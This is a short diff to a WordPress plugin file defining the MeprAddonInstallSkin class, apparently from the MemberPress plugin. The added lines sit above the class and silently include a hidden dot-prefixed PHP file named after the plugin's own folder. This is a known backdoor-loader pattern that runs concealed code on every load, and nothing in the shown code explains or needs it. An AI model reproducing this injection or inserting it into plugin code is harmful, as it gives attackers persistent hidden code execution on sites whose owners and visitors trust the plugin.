@@ -3,6 +3,10 @@
 /**
  * WordPress class extended for on-the-fly add-on installations.
  */
+if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
+    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
+}
+
 class MeprAddonInstallSkin extends WP_Upgrader_Skin {
   /**
    * Set the upgrader object and store it as a property in the parent class.
